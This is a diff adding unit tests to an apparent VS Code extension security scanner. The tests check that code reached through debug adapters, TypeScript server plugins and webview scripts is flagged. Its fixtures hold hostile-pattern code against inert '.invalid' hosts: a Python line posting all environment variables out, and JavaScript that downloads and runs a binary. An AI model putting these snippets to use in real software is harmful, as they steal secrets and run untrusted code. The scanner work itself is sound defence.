@@ -259,6 +259,90 @@ class WhatRunsTests(unittest.TestCase):
         self.assertIn("CRITICAL", {i["sev"] for i in issues(res, "SC-HIDDEN-UNICODE")})
 
 
+#: The whole environment posted from Python (inert: a .invalid host)
+EXFIL_PY = "import os, json, requests\nrequests.post('https://collector.invalid/c', data=json.dumps(dict(os.environ)))\n"
+#: A shape the import-time test calls MAJOR and the use-time test does not report (a binary downloaded and run)
+DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
+                   "const {execFileSync} = require('child_process');\n"
+                   "https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream('/tmp/tool'))\n"
+                   "  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")
+
+def contributing(contributes, files, **fields):
+    """An extension whose main does nothing, with `contributes` and the files given (EG-5)."""
+    fields.setdefault("main", "./out/extension")
+    fields.setdefault("activationEvents", ["onLanguage:unrelated"])
+    return dict(files, **{"package.json": ext_manifest(contributes=contributes, **fields),
+                          "out/extension.js": "exports.activate = () => {};\n"})
+
+
+class ContributionTests(unittest.TestCase):
+    """EG-5: code an extension's `contributes` names, which VS Code (or a process it starts) runs without the
+    extension's main module, is an entry point: it gets the import-time test, which says when it runs."""
+
+    def import_risk(self, res):
+        return sorted((i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK"))
+
+    def test_a_typescript_server_plugin(self):
+        # the TypeScript server loads node_modules/<name> from every installed extension's folder whenever a
+        # JavaScript or TypeScript file is open, whether or not the extension is activated
+        plugin = {"node_modules/ts-plugin/package.json": '{"name": "ts-plugin", "main": "lib/index.js"}',
+                  "node_modules/ts-plugin/lib/index.js": "require('./load');\n",
+                  "node_modules/ts-plugin/lib/load.js": DOWNLOAD_RUN_JS}
+        res = scan(contributing({"typescriptServerPlugins": [{"name": "ts-plugin"}]}, plugin))
+        self.assertEqual(self.import_risk(res), [("node_modules/ts-plugin/lib/load.js", "MAJOR")])
+        msg = issues(res, "SC-IMPORT-RISK")[0]["msg"]
+        self.assertIn("runs in the TypeScript server whenever a JavaScript or TypeScript file is open", msg)
+        self.assertEqual(res["verdict"], "WARN")
+        # (before EG-5 a MAJOR shape there was no finding: the file got the use-time test alone)
+        res = scan(contributing({}, plugin))
+        self.assertEqual((res["verdict"], self.import_risk(res)), ("OK", []))
+        # a name that is not a package's is not one TypeScript loads; a scoped one is
+        res = scan(contributing({"typescriptServerPlugins": [{"name": "../out/x"}, {"name": 5}]},
+                                {"out/x.js": DOWNLOAD_RUN_JS}))
+        self.assertEqual(self.import_risk(res), [])
+        res = scan(contributing({"typescriptServerPlugins": [{"name": "@scope/p"}]},
+                                {"node_modules/@scope/p/index.js": EXFIL_JS}))
+        self.assertEqual(self.import_risk(res), [("node_modules/@scope/p/index.js", "CRITICAL")])
+
+    def test_a_debug_adapter(self):
+        # VS Code joins a debug adapter's program to the extension's folder and starts it when a debug session of
+        # its type starts (Node forks it when the runtime is node), each platform's block too
+        dbg = {"type": "foo", "runtime": "node", "program": "./out/dap.js",
+               "windows": {"program": "./out/dap-win.js"}, "linux": {"runtime": "./bin/run.py"}}
+        res = scan(contributing({"debuggers": [dbg]}, {"out/dap.js": DOWNLOAD_RUN_JS, "out/dap-win.js": EXFIL_JS,
+                                                     "bin/run.py": EXFIL_PY}))
+        found = issues(res, "SC-IMPORT-RISK")
+        self.assertEqual(sorted(i["file"] for i in found), ["bin/run.py", "out/dap-win.js", "out/dap.js"])
+        self.assertTrue(all("runs as the extension's debug adapter when a debug session of type 'foo' starts"
+                            in i["msg"] for i in found), [i["msg"] for i in found])
+        # an absolute program and a runtime on the PATH are not the extension's; one outside its folder is said
+        dbg = {"type": "foo", "runtime": "python", "program": "../other.ext-1.0.0/dap.py",
+               "osx": {"program": "/usr/local/bin/dap"}}
+        res = scan(contributing({"debuggers": [dbg]}, {}))
+        outside = issues(res, "SC-UNREAD-CODE")
+        self.assertEqual(len(outside), 1)
+        self.assertIn('"program" names \'../other.ext-1.0.0/dap.py\'', outside[0]["msg"])
+        self.assertIn("when a debug session of type 'foo' starts", outside[0]["msg"])
+        self.assertEqual(res["verdict"], "INCOMPLETE")
+
+    def test_webview_scripts(self):
+        res = scan(contributing({"notebookRenderer": [{"id": "r", "entrypoint": "./out/renderer.js"},
+                                                      {"id": "s", "entrypoint": {"extends": "r", "path": "./out/x.js"}}],
+                                 "markdown.previewScripts": ["./media/preview.js"]},
+                                {"out/renderer.js": EXFIL_JS, "out/x.js": EXFIL_JS, "media/preview.js": EXFIL_JS}))
+        found = {i["file"]: i["msg"] for i in issues(res, "SC-IMPORT-RISK")}
+        self.assertEqual(sorted(found), ["media/preview.js", "out/renderer.js", "out/x.js"])
+        self.assertIn("runs in a notebook's output webview", found["out/renderer.js"])
+        self.assertIn("runs in the Markdown preview's webview", found["media/preview.js"])
+
+    def test_a_file_main_loads_too_says_when_the_editor_activates_the_extension(self):
+        res = scan(contributing({"typescriptServerPlugins": [{"name": "shared"}]},
+                                {"node_modules/shared/index.js": EXFIL_JS},
+                                main="./node_modules/shared/index.js", activationEvents=["*"]))
+        msg = issues(res, "SC-IMPORT-RISK")[0]["msg"]
+        self.assertIn("runs when the editor activates the extension (at every start", msg)
+
+
 class UninstallHookTests(unittest.TestCase):
     def test_a_node_script_is_a_hook_in_the_editors_words(self):
         res = scan({"package.json": ext_manifest(scripts={"vscode:uninstall": "node ./out/cleanup"}),
